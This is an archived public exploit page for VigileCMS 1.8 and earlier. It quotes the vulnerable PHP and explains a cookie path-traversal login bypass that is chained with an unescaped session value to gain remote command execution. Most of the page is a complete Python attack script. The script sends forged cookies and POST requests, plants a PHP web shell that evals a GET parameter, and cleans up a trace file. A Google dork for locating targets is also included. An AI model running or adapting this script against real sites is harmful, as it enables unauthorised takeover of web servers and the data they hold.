<html><head><title>VigileCMS <= 1.8 Stealth Remote Command Execution Exploit</title></head><pre>#!/usr/bin/python
#-*- coding: iso-8859-15 -*-
'''
 _   _                                   _         
| |_| |_  ___  _  _ __  __ _ _ _ __ _ __| |_____ __
|  _| ' \/ -_)|_|| '_ \/ _` | '_/ _` / _` / _ \ \ /
 \__|_||_\___||_|| .__/\__,_|_| \__,_\__,_\___/_\_\
                 |_|                               
------------------------------------------------------------------------------------------------
This is a Public Exploit. 22/11/2007 (dd-mm-yyyy)
------------------------------------------------------------------------------------------------
Â§ 0day VigileCMS &lt;= 1.8 Stealth - Remote Command Execution Â§
Vendor:	  http://www.vigilenapoletano.it
Severity: Highest
Author:	  The:Paradox
Italy r0x.

Visit inj3ct-it.org

Comments: This exploit was coded to show some people what a real vulnerability is. 
------------------------------------------------------------------------------------------------
Related Codes:

--- index.php; line 64:

if (isset($_COOKIE[rem_user]) and isset ($_COOKIE[rem_pass]) and !isset($_SESSION[user])) {
    if(file_exists(USERS_TAB.&quot;/$_COOKIE[rem_user].$_COOKIE[rem_pass].php&quot;)){
        $_SESSION[user] = $_COOKIE[rem_user];
        $_SESSION[pass] = $_COOKIE[rem_pass];
        logthis(&quot;$_SESSION[user] si Ã¨ collegato al Sito: riconosciuto con Cookie!&quot;);
        UserVisita ();// aggiornamento database utente per numero di visite
    }
}

--- func.inc.php; line 93:

function is_admin(){ 	//## FUNCTION ##
    if( (isset($_SESSION[user]) and isset($_SESSION[pass])) &amp;&amp; (file_exists(ADMIN_TAB.&quot;/$_SESSION[user].$_SESSION[pass].php&quot;)) ){
	return true;
    } else {
        return false;
    }
}

--- func.inc.php; line 109:

function is_superadmin(){ 	//## FUNCTION ##
    include (LOGS_TAB.&quot;/creazione.php&quot;);
    if (isset($_SESSION[&quot;user&quot;]) and isset($_SESSION[&quot;pass&quot;]) and ($_SESSION[user]==$primo_amministra)) {
	return true;
    } else {
        return false;
    }
}

--- vedipm.php; line 210:

            if ($_POST[ttl] ==&quot;&quot;) $_POST[ttl]=&quot;Nessun oggetto&quot;;

            $_POST[ttl] =stripslashes($_POST[ttl]);
            $_POST[ttl] =htmlspecialchars($_POST[ttl]); // impedisce visualizzazioni caratteri html e &lt;script&gt; maligni tipo javascript
            $_POST[cont]=stripslashes($_POST[cont]);
            $_POST[cont]=htmlspecialchars($_POST[cont]); // impedisce visualizzazioni caratteri html e &lt;script&gt; maligni tipo javascript
            $_POST[cont]=str_replace(&quot;\r\n&quot;,&quot;[br]&quot;,$_POST[cont]);
            $_POST[cont]=str_replace(&quot;&lt;~&gt;&quot;,&quot;&lt;|&gt;&quot;,$_POST[cont]);
            $_POST[ttl]=str_replace(&quot;&lt;~&gt;&quot;,&quot;&lt;|&gt;&quot;,$_POST[ttl]);

            $time = time();

            $newpm = fopen (PM_TAB.&quot;/$_POST[to]&quot;, &quot;a&quot;);
            fwrite ($newpm, &quot;$_POST[ttl]&lt;~&gt;$_POST[cont]&lt;~&gt;$_SESSION[user]&lt;~&gt;$time&lt;~&gt;non_letto\r\n&quot;);
            fclose($newpm);
------------------------------------------------------------------------------------------------
Bug Explanation:

The platform presents some vulnerabilities in the &quot;login system&quot; and in the &quot;private message sender system&quot;.
The first vulnerability is in index.php that verifies the login without sql database verifying the existence of files with the structure Nick.HashMD5Password.php in a dir &quot;db&quot;.
The cms'coder didn't thought about directory transversal. In fact if we try to login with these cookies:

rem_user = /../users/Nick
rem_pass = HashMD5Password

Where Nick and HashMD5Password are an existent UserName and MD5 Password's Hash, we'll gain administration rights. This happens because the &quot;function is_admin&quot; will check the file existence of /db/admin/../users/Nick.HashMD5Password.php
Obvious this may work with any file (with some collateral errors because it missed an include :P)
Whatever this doesn't make us able to do a lot of action in control panel because we will not have superadmin rights (see is_superadmin() function)
The second vulnerability is in vedipm.php and make us able to write a file on the server, but we can't get a RCE because our action are limited by htmlspecialchars that changes characters of php code (&lt; &gt;). Whatever $_SESSION[user] is not htmlspecialcharsed.
Using the first and the second vulnerability we can gain a RCE. We will create a &quot;file named with php code&quot; , with this we'll login and get an evil $_SESSION[user] that will be written in a php file.
------------------------------------------------------------------------------------------------
A lot of other Vulnerabilities have been found in this platform, but their functionality depends by the configuration OFF of MAGIC QUOTES or other uses of vulnerabilities I explained , so they were not published.
------------------------------------------------------------------------------------------------
Google Dork-&gt; Powered by Cms Vigile
------------------------------------------------------------------------------------------------
Use this exploit at your own risk. You are responsible for your own deeds.
Not tested on version &lt; of 1.6
------------------------------------------------------------------------------------------------
Use your brain, do not lame. Enjoy. =)
'''
#Python exploit starts:
#Version 2 of this exploit. Not the one published on some sites.

import sys, httplib, urllib
	
print &quot;\n################################################&quot;
print &quot;            VigileCMS &lt;= 1.8 Stealth            &quot;
print &quot;            Remote Command Execution            &quot;
print &quot;                                                &quot;
print &quot;            Discovered By The:Paradox           &quot;          
print &quot;                                                &quot;
print &quot; Usage:                                         &quot; 
print &quot; %s [Target] [Path]         	               &quot; % (sys.argv[0])
print &quot;                                                &quot;	
print &quot; Example:                                       &quot; 			
print &quot; python %s 127.0.0.1 /vigilecms/                &quot; % (sys.argv[0])
print &quot;                                                &quot;	
print &quot;    You may have to set other options in the    &quot;	
print &quot;        code, like port if it isn't 80          &quot;
print &quot;     or options for old viglecms' versions.     &quot;	
print &quot;                                                &quot;		
print &quot;################################################\n&quot;
if len(sys.argv)&lt;=1:	sys.exit()
else:   print &quot;[.]Exploit Starting.&quot;		

#Some Vars
old = 0 #set to 1 if you are trying to exploit a 1.6 vigile cms version
port = 80
db = &quot;db&quot; #Directory of database
target = sys.argv[1]
try:directory = sys.argv[2]
except IndexError:directory = &quot;/&quot;
#Starting
ver1 = &quot;&quot;
ver2 = &quot;&quot;
try:
	#Verifing  /db/index.php
	conn = httplib.HTTPConnection(target,port)
	conn.request(&quot;GET&quot;, &quot;%s%s/index.php&quot; % (directory,db))
	r1 = conn.getresponse()
	print &quot;Verifing existence of-&gt; %s%s%s/index.php&quot; % (target,directory,db),r1.status, r1.reason
	if r1.status == 404:
		print &quot;[-]%s/index.php not found (404).&quot; % (db)
		ver1 = &quot;no&quot;
	conn.close()
	#Verifing  /pm/index.php
	conn = httplib.HTTPConnection(target,port)
	conn.request(&quot;GET&quot;, &quot;%s%s/pm/index.php&quot; % (directory,db))
	r1 = conn.getresponse()
	print &quot;Verifing existence of-&gt; %s%s%s/pm/index.php&quot; % (target,directory,db),r1.status, r1.reason
	if r1.status == 404:
		print&quot;[-]%s/pm/index.php not found (404).&quot; % (db)
		ver2 = &quot;no&quot;
except httplib.ResponseNotReady:
	sys.exit(&quot;[-]ResponseNotReady. Aborted. Check your connection.&quot;)

if old == 1: 
	pt = &quot;/&quot;
	pt2 = &quot;?&quot;
else: 
	pt = &quot;?&quot;
	pt2 = &quot;&amp;&quot;
	
if ver1 == &quot;no&quot; or ver2 == &quot;no&quot;: 
	transversal = &quot;..&quot;
	print &quot;[-]One or more Get request returned 404 error. Trying to continue with / path.&quot;
else : transversal = &quot;&quot;

conn = httplib.HTTPConnection(target,port)
conn.request(&quot;POST&quot;, &quot;%s/index.php%spag=vedipm%sinviapm=true&quot; % (directory,pt,pt2), urllib.urlencode({'to': transversal +'/../&lt;?php eval(stripslashes($_GET[dox])); ?&gt;.paradox-got-this-one.php', 'cont': 1}), {&quot;Accept&quot;: &quot;text/plain&quot;,&quot;Cookie&quot;: &quot;rem_user=%2F..%2F; rem_pass=%2Findex;&quot;,&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;})
response = conn.getresponse()
print &quot;[.]Doing Post Connection #1 --&gt;&quot;,response.status, response.reason
conn.close()

conn = httplib.HTTPConnection(target,port)
conn.request(&quot;POST&quot;, &quot;%s/index.php%spag=vedipm%sinviapm=true&quot; % (directory,pt,pt2), urllib.urlencode({'to': transversal +'/../igotyourbox.php' , 'cont': 1}), {&quot;Accept&quot;: &quot;text/plain&quot;,&quot;Cookie&quot;: &quot;rem_user=&quot;+ transversal +&quot;%2F..%2F%3C%3Fphp+eval(stripslashes(%24_GET%5Bdox%5D))%3B+%3F%3E; rem_pass=paradox-got-this-one;&quot;,&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;})
response = conn.getresponse()
print &quot;[.]Doing Post Connection #2 --&gt;&quot;,response.status, response.reason
conn.close()
try:
	if transversal == &quot;..&quot;:	path = &quot;%sigotyourbox.php&quot; % (directory)
	elif transversal == &quot;&quot;: 	path = &quot;%s%s/igotyourbox.php&quot; % (directory,db)
			
	conn = httplib.HTTPConnection(target,port)
	conn.request(&quot;GET&quot;, path)
	r1 = conn.getresponse()
	conn.close()
except httplib.ResponseNotReady:
	sys.exit(&quot;[-]ResponseNotReady. Aborted.&quot;)
	
print &quot;[.]Verifing Exploit Success...&quot;
if r1.status == 404:
	sys.exit(&quot;[-]Exploit Failed.&quot;)
else:
	print &quot;[+]Done.\n[+]Removing the page...&quot;
	conn = httplib.HTTPConnection(target,port)
	getrm = path + &quot;?dox=unlink('%3C%3Fphp+eval(stripslashes(%24_GET%5Bdox%5D))%3B+%3F%3E.paradox-got-this-one.php');&quot; 
	conn.request(&quot;GET&quot;, getrm)
	print &quot;[+]Success :D Exploited.\n\n A PHP Page Has Been Created -&gt; %s%s \n With Content:\n &lt;?php eval(stripslashes($_GET[dox])); ?&gt;\n Execute your php codes :P Have Fun :D\n\n-= Paradox Got This One :D =-\n&quot; % (target,path)

# milw0rm.com [2007-11-22]</pre></html>